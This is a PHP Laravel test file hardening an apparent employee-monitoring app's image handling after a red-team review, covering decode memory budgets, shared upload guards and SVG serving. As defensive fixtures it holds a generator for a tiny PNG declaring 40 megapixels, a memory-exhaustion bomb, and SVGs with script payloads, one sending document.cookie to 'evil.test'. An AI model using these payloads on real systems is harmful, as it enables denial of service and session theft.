<?php

namespace Tests\Feature;

use App\Models\MonitoringSetting;
use App\Models\PlatformUser;
use App\Models\SiteMedia;
use App\Models\SiteTheme;
use App\Models\TrackingScreenshot;
use App\Models\TrackingSession;
use App\Models\User;
use App\Services\TenantProvisioner;
use App\Support\ImageGuard;
use App\Support\ImageResizer;
use App\Tenancy\CurrentOrganization;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Bus;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * The DEFENCES for the second red-team round on image handling. Every test here
 * was verified to FAIL against the pre-fix code.
 *
 * The round-one fix believed a 40 megapixel budget capped GD at ~160 MB. It does
 * not: the measured cost is ~7.3 bytes per source pixel, so 40 Mpx is ~274 MB,
 * and an 89-byte PNG can declare it. Three things follow, and all three are
 * tested here:
 *
 *   - a pixel constant cannot bound memory, so the decode budget is derived from
 *     the memory the process actually has;
 *   - a memory-limit fatal is uncatchable, so the "we already failed at this"
 *     record has to be written BEFORE the decode, not in a catch block;
 *   - a guard on one upload path is not a guard, because the app had four other
 *     doors into the same storage.
 *
 * Plus the two things the round-one fix got wrong in the other direction: the
 * per-axis rule that refused honest ultrawide screenshots, and the installer
 * rate limit that 429'd a NAT'd office mid-rollout.
 */
class ImageBudgetAndServingHardeningTest extends TestCase
{
    use RefreshDatabase;

    // ─── helpers ────────────────────────────────────────────────────────────

    private function tenantOwner(string $name, string $email): User
    {
        $owner = app(TenantProvisioner::class)->provision($name, 'Owner', $email, 'secret-pass-123')['owner'];
        app(CurrentOrganization::class)->set($owner->organization_id);

        return $owner->fresh();
    }

    private function operator(string $email = 'imgop@platform.test'): PlatformUser
    {
        return PlatformUser::create([
            'name' => 'Operator',
            'email' => $email,
            'password' => 'operator-secret-pw',
            'role' => 'owner',
        ]);
    }

    /**
     * A PNG whose IHDR DECLARES $w x $h but whose IDAT is junk — 89 bytes on
     * disk. Every header-only check in the app sees the declared size; GD would
     * allocate the whole declared raster before discovering the data is bad.
     */
    private function declaredSizePngBytes(int $w, int $h): string
    {
        $chunk = fn (string $t, string $d): string => pack('N', strlen($d)).$t.$d.pack('N', crc32($t.$d));

        return "\x89PNG\r\n\x1a\n"
            .$chunk('IHDR', pack('NN', $w, $h)."\x08\x02\x00\x00\x00")
            .$chunk('IDAT', str_repeat("\x00", 32))
            .$chunk('IEND', '');
    }

    private function declaredSizePng(int $w, int $h, string $name = 'avatar.png'): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'guard').'.png';
        file_put_contents($path, $this->declaredSizePngBytes($w, $h));

        return new UploadedFile($path, $name, 'image/png', null, true);
    }

    private function activeSession(User $owner, string $uuid): TrackingSession
    {
        MonitoringSetting::current()->update(['screenshots_per_hour' => 50, 'capture_enabled' => true]);

        return TrackingSession::create([
            'user_id' => $owner->id,
            'client_uuid' => $uuid,
            'started_at' => now(),
            'status' => TrackingSession::STATUS_ACTIVE,
            'source' => 'desktop',
        ]);
    }

    // ─── 1. the budget is anchored to measured memory ───────────────────────

    /**
     * The per-pixel cost the budget is built on must not drift back to the
     * folklore figure of 4 bytes. Measured here in a clean child process, the
     * same way the red team measured it, so this fails if a future GD/PHP makes
     * the constant optimistic rather than conservative.
     */
    public function test_bytes_per_pixel_constant_is_not_optimistic_about_gd(): void
    {
        $bytes = $this->declaredSizePngBytes(2000, 2000);

        $blob = tempnam(sys_get_temp_dir(), 'blob');
        file_put_contents($blob, $bytes);

        $script = tempnam(sys_get_temp_dir(), 'probe').'.php';
        file_put_contents($script, '<?php $b=file_get_contents('.var_export($blob, true).');'
            .'$p0=memory_get_peak_usage(true);@imagecreatefromstring($b);'
            .'echo memory_get_peak_usage(true)-$p0;');

        $measured = (int) trim((string) shell_exec(escapeshellarg(PHP_BINARY).' -d memory_limit=512M '.escapeshellarg($script)));

        @unlink($blob);
        @unlink($script);

        $this->assertGreaterThan(0, $measured, 'could not measure GD cost in a child process');

        $perPixel = $measured / (2000 * 2000);

        $this->assertGreaterThan(4.0, $perPixel, 'sanity: GD really does cost more than the 4 B/px folklore');
        $this->assertGreaterThanOrEqual(
            $perPixel,
            (float) ImageGuard::BYTES_PER_PIXEL,
            'ImageGuard::BYTES_PER_PIXEL under-estimates what GD actually allocates',
        );
    }

    /**
     * The budget that guards a DECODE has to come from the memory the process
     * has, not from a constant — the same image is safe on a 512 MB worker and
     * fatal in a 128 MB FPM child.
     */
    public function test_decode_budget_shrinks_with_the_process_memory_limit(): void
    {
        $small = ImageGuard::decodePixelBudget(128 * 1024 * 1024, 32 * 1024 * 1024);
        $large = ImageGuard::decodePixelBudget(512 * 1024 * 1024, 32 * 1024 * 1024);

        $this->assertLessThan($large, $small, 'the budget ignores the memory limit');

        // The red team's bomb: 8000x4999 = 39,992,000 px, ~274 MB of GD.
        $this->assertFalse(
            ImageGuard::canDecode(8000, 4999, $small),
            'a 40 Mpx decode is still considered affordable in a 128 MB process',
        );

        // ...while an ordinary 1080p capture stays decodable even there.
        $this->assertTrue(ImageGuard::canDecode(1920, 1080, $small));

        // And the budget never exceeds what the limit can actually hold.
        $this->assertLessThanOrEqual(
            128 * 1024 * 1024,
            ImageGuard::estimatedDecodeBytes(1, $small),
            'the budget permits more bytes than the memory limit allows',
        );
    }

    // ─── 2. degrade once, not forever ───────────────────────────────────────

    /**
     * The core of the self-sustaining DoS: an OOM fatal unwinds nothing, so
     * Cache::remember() never writes and the next request repeats the identical
     * fatal, forever, on an anonymous route.
     *
     * The breadcrumb is written BEFORE the decode precisely so it outlives the
     * crash. This plants an aged breadcrumb — exactly what a process that died
     * mid-decode leaves behind — and asserts the next caller refuses to repeat
     * the work rather than walking into it again.
     */
    public function test_a_decode_that_never_returned_is_not_attempted_a_second_time(): void
    {
        $key = 'unit-test-asset';
        $attemptPrefix = (new \ReflectionClassConstant(ImageGuard::class, 'ATTEMPT_PREFIX'))->getValue();

        // The corpse of a process that entered decodeOnce() and never came out.
        Cache::put($attemptPrefix.$key, microtime(true) - 600, 900);

        $decodes = 0;
        $decode = function () use (&$decodes) {
            $decodes++;

            return 'decoded';
        };

        $first = ImageGuard::decodeOnce($key, $decode, fn () => 'fallback');
        $this->assertSame('fallback', $first);
        $this->assertSame(0, $decodes, 'it walked straight back into the decode that just killed a process');
        $this->assertTrue(ImageGuard::isUnrenderable($key), 'the failure was not recorded, so it will loop again');

        // ...and it stays refused on every later request, which is the whole point.
        $this->assertSame('fallback', ImageGuard::decodeOnce($key, $decode, fn () => 'fallback'));
        $this->assertSame(0, $decodes);

        // A re-upload clears the verdict — a replaced asset must not inherit it.
        ImageGuard::forgetDecodeVerdict($key);
        $this->assertSame('decoded', ImageGuard::decodeOnce($key, $decode, fn () => 'fallback'));
        $this->assertSame(1, $decodes);
    }

    /** A healthy decode leaves no breadcrumb behind, so it is never mistaken for a corpse. */
    public function test_a_successful_decode_clears_its_own_breadcrumb(): void
    {
        $key = 'healthy-asset';

        $this->assertSame('ok', ImageGuard::decodeOnce($key, fn () => 'ok', fn () => 'fallback'));
        $this->assertFalse(ImageGuard::isUnrenderable($key));

        $calls = 0;
        $this->assertSame('ok-again', ImageGuard::decodeOnce($key, function () use (&$calls) {
            $calls++;

            return 'ok-again';
        }, fn () => 'fallback'));
        $this->assertSame(1, $calls, 'a healthy asset was condemned by its own previous success');
    }

    /**
     * The chokepoint every avatar/logo render reaches GD through. Over budget it
     * must hand the ORIGINAL bytes back — the contract it already had for every
     * other failure — rather than starting an allocation it cannot finish.
     */
    public function test_image_resizer_refuses_a_decode_it_cannot_afford_and_returns_the_original(): void
    {
        // 39.99 Mpx — the red team's exact bomb. The largest budget this process
        // can ever compute is MAX_PIXELS * 0.6, so this is refused regardless of
        // the machine the suite runs on.
        $bomb = $this->declaredSizePngBytes(8000, 4999);

        $result = ImageResizer::fit($bomb, 320);

        $this->assertSame($bomb, $result['bytes'], 'ImageResizer decoded a 40 Mpx image');
        $this->assertNull($result['mime']);
    }

    // ─── 3. every upload door shares the one guard ──────────────────────────

    /**
     * The sub-budget bomb, at each of the five doors into image storage. Four of
     * them had no dimension check whatsoever before this round, so a header the
     * profile form rejected outright was accepted everywhere else.
     */
    public function test_self_service_profile_refuses_the_sub_budget_bomb(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('Prof Co', 'owner@profco.test');

        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@profco.test',
            'avatar' => $this->declaredSizePng(8000, 4999),
        ])->assertSessionHasErrors('avatar');

        $this->assertNull($owner->fresh()->avatar);
    }

    public function test_admin_user_create_and_edit_refuse_the_sub_budget_bomb(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('AdminDoor Co', 'owner@admindoor.test');

        $this->actingAs($owner)->post('/users', [
            'name' => 'Mule',
            'email' => 'mule@admindoor.test',
            'password' => 'secret-pass-123',
            'password_confirmation' => 'secret-pass-123',
            'role' => 'member',
            'avatar' => $this->declaredSizePng(8000, 4999),
        ])->assertSessionHasErrors('avatar');

        $this->assertNull(User::where('email', 'mule@admindoor.test')->first());

        // The edit form is the same door with a different verb.
        $victim = User::factory()->create([
            'organization_id' => $owner->organization_id,
            'email' => 'victim@admindoor.test',
        ]);

        $this->actingAs($owner)->put('/users/'.$victim->id, [
            'name' => 'Victim',
            'email' => 'victim@admindoor.test',
            'role' => 'member',
            'avatar' => $this->declaredSizePng(8000, 4999),
        ])->assertSessionHasErrors('avatar');

        $this->assertNull($victim->fresh()->avatar);
    }

    /**
     * The worst of them: this upload feeds /branding/logo, which is ANONYMOUS
     * because it renders on the login page.
     */
    public function test_branding_logo_upload_refuses_the_sub_budget_bomb(): void
    {
        Storage::fake('avatars');

        $admin = $this->tenantOwner('Brand Co', 'owner@brandco2.test');

        $this->actingAs($admin)->post(route('settings.branding.logo'), [
            'logo' => $this->declaredSizePng(8000, 4999, 'logo.png'),
        ])->assertSessionHasErrors('logo');

        $this->assertNull(MonitoringSetting::current()->fresh()->branding_logo_path);

        // ...and an honest logo still works, which is the half that matters to
        // the customer.
        $this->actingAs($admin)->post(route('settings.branding.logo'), [
            'logo' => $this->declaredSizePng(512, 512, 'ok.png'),
        ])->assertSessionHasNoErrors();

        $this->assertNotNull(MonitoringSetting::current()->fresh()->branding_logo_path);
    }

    public function test_site_builder_image_and_logo_uploads_refuse_the_bomb(): void
    {
        Storage::fake('avatars');

        $this->actingAs($this->operator('img@platform.test'), 'platform')
            ->postJson(route('platform.site.image'), ['image' => $this->declaredSizePng(40000, 40000, 'hero.png')])
            ->assertStatus(422);

        $this->assertSame(0, SiteMedia::count());

        $this->actingAs($this->operator('imglogo@platform.test'), 'platform')
            ->post(route('platform.site.logo'), ['logo' => $this->declaredSizePng(8000, 4999, 'logo.png')])
            ->assertSessionHasErrors('logo');

        $this->assertNull(SiteTheme::current()->fresh()->logo_path);
    }

    /**
     * The desktop API keeps the WIDER budget — a screenshot legitimately spans
     * several monitors — but still refuses what it cannot afford, and says why
     * in a machine-readable way so the agent can stop buffering that capture.
     */
    public function test_desktop_screenshot_api_refuses_an_over_budget_capture_and_explains_why(): void
    {
        Storage::fake('screenshots');
        Bus::fake();

        $owner = $this->tenantOwner('Shot Co', 'owner@shotco2.test');
        $session = $this->activeSession($owner, 'uuid-over-budget');
        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $response = $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(9000, 9000, 'huge.png'), // 81 Mpx
            ], ['Accept' => 'application/json']);

        $response->assertStatus(422);
        $this->assertSame(0, TrackingScreenshot::count());

        // Not a silent drop: the rejection names the actual size and the limit.
        $this->assertMatchesRegularExpression(
            '/9000|megapixel/i',
            json_encode($response->json()),
            'the rejection does not tell the agent what was wrong',
        );
    }

    // ─── 4. the collateral damage the last round caused ─────────────────────

    /**
     * COLLATERAL DAMAGE, UNDONE. `dimensions:max_width=8000,max_height=8000` is
     * per-axis, so three 4K monitors side by side (11520x2160 = 24.9 Mpx, 62% of
     * the pixel budget) got a 422 and the capture was lost. For a monitoring
     * product, a developer's workstation that quietly stops producing evidence
     * is worse than the attack that motivated the rule.
     */
    public function test_a_legitimate_triple_4k_capture_is_accepted(): void
    {
        Storage::fake('screenshots');
        Bus::fake();

        $owner = $this->tenantOwner('Wide Co', 'owner@wideco2.test');
        $session = $this->activeSession($owner, 'uuid-triple-4k');
        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $this->assertLessThan(ImageGuard::MAX_PIXELS, 11520 * 2160, 'sanity: inside the pixel budget');

        $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(11520, 2160, 'triple-4k.png'),
            ], ['Accept' => 'application/json'])
            ->assertStatus(201);

        $this->assertSame(1, TrackingScreenshot::count());
    }

    /**
     * The exact bomb, at the one door that keeps the WIDE budget. 8000x4999 was
     * chosen to sit just under a 40 Mpx line; nothing a real monitor array
     * produces lives between the quad-4K case (33.2 Mpx) and 40 Mpx, so the line
     * moved to 36 and the bomb no longer has a gap to sit in.
     */
    public function test_desktop_screenshot_api_refuses_the_sub_budget_bomb(): void
    {
        Storage::fake('screenshots');
        Bus::fake();

        $owner = $this->tenantOwner('Sub Co', 'owner@subco.test');
        $session = $this->activeSession($owner, 'uuid-sub-budget');
        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(8000, 4999, 'bomb.png'),
            ], ['Accept' => 'application/json'])
            ->assertStatus(422);

        $this->assertSame(0, TrackingScreenshot::count());
    }

    /** ...while the widest HONEST array — four 4K monitors — still gets through. */
    public function test_a_quad_4k_capture_is_accepted(): void
    {
        Storage::fake('screenshots');
        Bus::fake();

        $owner = $this->tenantOwner('Quad Co', 'owner@quadco.test');
        $session = $this->activeSession($owner, 'uuid-quad-4k');
        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(15360, 2160, 'quad-4k.png'),
            ], ['Accept' => 'application/json'])
            ->assertStatus(201);

        $this->assertSame(1, TrackingScreenshot::count());
    }

    /** The same shape, taller rather than wider — a stacked monitor pair. */
    public function test_a_tall_stacked_monitor_capture_is_accepted(): void
    {
        Storage::fake('screenshots');
        Bus::fake();

        $owner = $this->tenantOwner('Tall Co', 'owner@tallco.test');
        $session = $this->activeSession($owner, 'uuid-tall');
        $token = $owner->createToken('Dev', ['desktop-tracker'])->plainTextToken;

        $this->withHeaders(['Authorization' => 'Bearer '.$token])
            ->post('/api/desktop/screenshots', [
                'tracking_session_id' => $session->id,
                'captured_at' => now()->toIso8601String(),
                'image' => $this->declaredSizePng(2160, 8640, 'stacked.png'),
            ], ['Accept' => 'application/json'])
            ->assertStatus(201);

        $this->assertSame(1, TrackingScreenshot::count());
    }

    /**
     * A NAT'd office rolling the tracker out to thirty people in a minute is
     * thirty full downloads from ONE address. The old hardcoded 20 429'd them
     * mid-rollout, which is a failed first day for a whole team.
     */
    public function test_the_installer_payload_budget_survives_a_natd_office(): void
    {
        $this->assertGreaterThanOrEqual(
            30,
            (int) config('desktop.payload_hits_per_minute'),
            'a 30-person office behind one IP still gets 429s',
        );

        // ...and it is tunable without a deploy.
        $this->assertMatchesRegularExpression(
            '/DESKTOP_PAYLOAD_HITS_PER_MINUTE/',
            (string) file_get_contents(base_path('config/desktop.php')),
        );
    }

    // ─── 5. the serving side of the SVG fix ─────────────────────────────────

    /**
     * The round-one SVG fix was write-side only. Every SVG stored BEFORE it —
     * i.e. every one the audit proved the live site had accepted — was still
     * served inline under its stored mime and still executed.
     */
    public function test_site_media_will_not_serve_a_stored_svg_mime_inline(): void
    {
        Storage::fake('avatars');

        $svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.test/?c="+document.cookie)</script></svg>';
        Storage::disk('avatars')->put('site/legacy.svg', $svg);

        $media = SiteMedia::create([
            'path' => 'site/legacy.svg',
            'mime' => 'image/svg+xml',
            'original_name' => 'legacy.svg',
        ]);

        $response = $this->get('/site/media/'.$media->id);

        $this->assertStringNotContainsString(
            'svg',
            strtolower((string) $response->headers->get('Content-Type')),
            'the stored svg mime is still echoed back, so the payload still executes',
        );
        $this->assertStringContainsString(
            'attachment',
            (string) $response->headers->get('Content-Disposition'),
            'the bytes are still served inline',
        );
    }

    /** A genuine raster is still served correctly, inline, under its real type. */
    public function test_site_media_still_serves_a_real_image_inline(): void
    {
        Storage::fake('avatars');

        Storage::disk('avatars')->put('site/real.png', $this->declaredSizePngBytes(64, 48));

        $media = SiteMedia::create([
            // Deliberately LYING mime column: the response must not trust it.
            'path' => 'site/real.png',
            'mime' => 'text/html',
            'original_name' => 'real.png',
        ]);

        $response = $this->get('/site/media/'.$media->id);

        $response->assertOk();
        $this->assertStringContainsString('image/png', (string) $response->headers->get('Content-Type'));
    }

    /** /site/logo had an EXPLICIT branch returning raw bytes as image/svg+xml. */
    public function test_site_logo_route_has_no_svg_branch_left(): void
    {
        Storage::fake('avatars');

        $svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>';
        Storage::disk('avatars')->put('site/brand.svg', $svg);

        SiteTheme::current()->update(['logo_path' => 'site/brand.svg']);
        SiteTheme::forgetCache();

        $response = $this->get('/site/logo');

        $this->assertNotSame(200, $response->getStatusCode(),
            'the svg branch still serves; the frontend should fall back to the bundled logo instead');
        $this->assertStringNotContainsString('<script>', (string) $response->getContent());
    }

    /** The app logo route decides its type from the bytes too. */
    public function test_branding_logo_route_refuses_non_raster_bytes(): void
    {
        Storage::fake('avatars');

        Storage::disk('avatars')->put('branding/evil.svg',
            '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');

        MonitoringSetting::current()->update(['branding_logo_path' => 'branding/evil.svg']);
        MonitoringSetting::forgetSharedCache();

        $response = $this->get(route('branding.logo'));

        $this->assertNotSame(200, $response->getStatusCode());
        $this->assertStringNotContainsString('<script>', (string) $response->getContent());
    }

    // ─── 6. the mitigation that could never run ─────────────────────────────

    /**
     * DesktopDownloadController::sendPayload() has always read
     * config('desktop.x_accel_prefix'), and the key did not exist. Production
     * runs config:cache, so it was permanently null and the "the worker is freed
     * immediately" branch could never execute outside a test that set the value
     * by hand — while the docblock advertised it as the headline mitigation.
     */
    public function test_the_x_accel_offload_is_actually_wired(): void
    {
        $shipped = require base_path('config/desktop.php');

        $this->assertArrayHasKey('x_accel_prefix', $shipped, 'the config key still does not exist');

        $this->assertMatchesRegularExpression(
            '/DESKTOP_X_ACCEL_PREFIX/',
            (string) file_get_contents(base_path('config/desktop.php')),
            'the key is not wired to an env var, so it can never be set in production',
        );

        $this->assertMatchesRegularExpression(
            '/DESKTOP_X_ACCEL_PREFIX/',
            (string) file_get_contents(base_path('.env.example')),
            'nothing tells an operator the variable exists',
        );

        // The nginx location must be documented where the key is defined —
        // setting the prefix without it 404s every installer download.
        $this->assertMatchesRegularExpression(
            '/internal;/',
            (string) file_get_contents(base_path('config/desktop.php')),
            'the required nginx snippet is not documented next to the key',
        );
    }
}
